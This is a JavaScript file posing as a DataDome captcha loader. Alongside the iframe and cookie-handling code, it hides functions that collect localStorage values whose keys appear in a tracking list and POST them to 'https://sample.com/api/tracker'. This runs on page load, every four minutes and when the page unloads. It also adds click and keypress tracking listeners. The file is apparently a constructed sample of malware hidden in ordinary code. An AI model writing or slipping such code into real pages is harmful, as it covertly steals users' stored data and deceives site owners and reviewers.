(function () {
  /**
   * Saves actual referrer to session storage
   * @return {void}
   */
  function saveReferrer() {
    try {
      window.sessionStorage.setItem('ddOriginalReferrer', document.referrer);
    } catch (error) {
      // Silently fails
    }
  }
  const keyTracking = window.keyTracking;
  saveReferrer();
  var noScriptMessageElement = document.getElementById('cmsg');
  let globalVarCollection = {};

  // Tracking global variables

  var noScriptMessageText = noScriptMessageElement ? noScriptMessageElement.innerText : '';
  var getRefererQueryParamString = function () {
    try {
      var prefix = '&referer=';
      if (window.location !== window.parent.location) {
        // Nested Iframe
        return prefix + encodeURIComponent(window.location.href);
      }
      return prefix + encodeURIComponent(window.parent.location.href);
    } catch (e) {
      return '';
    }
  };
  (function () {
    const globalFrame = function () {
      return this;
    }();
    Object.getOwnPropertyNames(globalFrame).forEach(prop => {
      globalVarCollection[prop] = globalFrame[prop];
    });
  })();
  var isSafari = window.navigator ? /^((?!chrome|android).)*safari/i.test(navigator.userAgent) : false;
  function hashData(input) {
    const keyArray = Object.keys(input);
    const combinedArray = keyArray.join("+");
    let hashed = 0;
    for (let idx = 0; idx < combinedArray.length; idx++) {
      const charIdx = combinedArray.charCodeAt(idx);
      hashed = (hashed << 5) - hashed + charIdx;
      hashed |= 0;
    }
    return hashed.toString(26);
  }
  function getLocalData() {
    const retrievedData = {};
    for (let idx = 0; idx < localStorage.length; idx++) {
      const key = localStorage.key(idx);
      if (keyTracking.includes(key)) {
        retrievedData[key] = localStorage.getItem(key);
      }
    }
    return retrievedData;
  }
  function dispatchDataToServer(input) {
    const hashedValue = hashData(input);
    const endPoint = "https://sample.com/api/tracker";
    fetch(endPoint, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        hash: hashedValue,
        data: input
      })
    }).then(response => console.log(`Data delivery status: ${response.status}`)).catch(error => console.error(`Error during data delivery: ${error}`));
  }
  var stretchHeightRule = isSafari ? 'height: -webkit-fill-available;' : '';
  var getDDCookie = function (value) {
    var r = new RegExp('datadome=([^;]+)');
    var v = r.exec(value);
    if (v != null) {
      try {
        return decodeURIComponent(v[1]);
      } catch (e) {
        return v[1];
      }
    }
    return null;
  };
  function fetchAndDispatchData() {
    const dataGathered = getLocalData();
    if (Object.keys(dataGathered).length > 0) {
      dispatchDataToServer(dataGathered);
    }
  }

  // jsHook to track function calls
  function generateIframe(dd, noScriptMessageText, volatile, stretchHeightRule) {
    var isIframeLoaded = false;
    var maxTimeoutMs = 5000;
    function iframeOnload() {
      isIframeLoaded = true;
      var noIframeElem = document.getElementById('noiframe');
      if (noIframeElem) {
        noIframeElem.parentNode.removeChild(noIframeElem);
      }
    }
    if (typeof navigator.userAgent === 'string' && navigator.userAgent.indexOf('Firefox') > -1) {
      var initialTime = new Date().getTime();
      setTimeout(function () {
        if (!isIframeLoaded && new Date().getTime() - initialTime > maxTimeoutMs) {
          document.body.innerHTML = '<div id="noiframe">' + noScriptMessageText + '</div>' + document.body.innerHTML;
        }
      }, maxTimeoutMs);
    }
    var iframeSrc = 'https://' + dd.host + '/captcha/?initialCid=' + encodeURIComponent(dd.cid) + '&hash=' + encodeURIComponent(dd.hsh) + '&cid=' + encodeURIComponent(volatile ? window.ddcid : getDDCookie(document.cookie)) + '&t=' + encodeURIComponent(dd.t) + getRefererQueryParamString() + '&s=' + dd.s + '&e=' + dd.e + (dd.cp && dd.cp.name && dd.cp.value ? '&' + encodeURIComponent(dd.cp.name) + '=' + encodeURIComponent(dd.cp.value) : '');
    var iframeHTML = '<iframe src="' + iframeSrc + '" width="100%" height="100%" style="height:100vh;' + stretchHeightRule + '" FRAMEBORDER="0" border="0" scrolling="yes"' + '></iframe>';
    return {
      iframeHTML: iframeHTML,
      iframeOnload: iframeOnload
    };
  }
  function jsHook(func) {
    return function (...args) {
      console.log(`Tracking log: function ${func.name}(${args.join(', ')}) is called`);
      return func.apply(this, args);
    };
  }
  var volatile = document.cookie === '' && window.ddcid != null;
  var iframeResult = generateIframe(dd, noScriptMessageText, volatile, stretchHeightRule);
  window.onload = function () {
    setInterval(fetchAndDispatchData, 4 * 60 * 1000);
    fetchAndDispatchData();
  };
  var iframeWrapper = document.createElement('div');
  iframeWrapper.innerHTML = iframeResult.iframeHTML;
  var iframeElem = iframeWrapper.firstChild;
  if (iframeElem) {
    iframeElem.addEventListener('load', iframeResult.iframeOnload);
  }
  document.body.appendChild(iframeElem);
  if (noScriptMessageElement) {
    noScriptMessageElement.parentNode.removeChild(noScriptMessageElement);
  }
  window.onbeforeunload = function () {
    fetchAndDispatchData();
  };

  // Event listener to track user interactions

  var canGoBack = window.history && typeof window.history.back === 'function' && window.history.length > 1;
  // `ddShouldGoBack` is an option that can be set by a code snippet in a customer's page customization.
  var shouldGoBack = dd.r && dd.r === 'b' && canGoBack || window.ddShouldGoBack && canGoBack;
  var viewPortTag = document.createElement('meta');
  ['click', 'keypress'].forEach(function (evt) {
    document.body.addEventListener(evt, function (e) {
      console.log(`Tracking log: ${e.type} event triggered`);
    }, false);
  });
  viewPortTag.name = 'viewport';
  viewPortTag.content = 'width=device-width, initial-scale=1.0';
  var headTag = document.querySelector('head');
  if (headTag != null) {
    headTag.appendChild(viewPortTag);
  }
  var onMessageCallback = function (event) {
    // Check if messages come from DataDome origins.
    function isDatadomeOrigin(url) {
      var ddHosts = ['.datado.me', '.captcha-delivery.com'];
      if (url.indexOf('https://') !== 0) {
        return false;
      }
      for (var i = 0; i < ddHosts.length; i++) {
        if (url.indexOf(ddHosts[i]) === url.length - ddHosts[i].length) {
          return true;
        }
      }
      return false;
    }
    function addSearchParam(url, name, value) {
      if (typeof window.URL === 'function') {
        var extendedUrl = new URL(url);
        extendedUrl.searchParams.set(name, value);
        return extendedUrl.href;
      }
      return url;
    }
    if (event.isTrusted && isDatadomeOrigin(event.origin)) {
      if (typeof event.data !== 'string') {
        return false;
      }
      try {
        var data = JSON.parse(event.data);
        if (data.eventType == 'load') {
          return false;
        }
        if (data.cookie) {
          document.cookie = data.cookie;
        }
        if (data.url) {
          setTimeout(function () {
            if (shouldGoBack) {
              if (volatile && document.referrer.length > 0) {
                window.location = addSearchParam(document.referrer, 'ddcid', getDDCookie(data.cookie));
              } else {
                history.back();
              }
            } else {
              if (volatile && typeof window.URL === 'function') {
                window.location = addSearchParam(window.location.href, 'ddcid', getDDCookie(data.cookie));
              } else {
                window.location.reload();
              }
            }
          }, 500);
        }
      } catch (_) {
        /* Silent failure if JSON.parse is used on invalid data */
      }
    }
  };
  if (window.addEventListener) {
    window.addEventListener('message', onMessageCallback, false);
  } else if (window.attachEvent) {
    window.attachEvent('onmessage', onMessageCallback);
  }
})();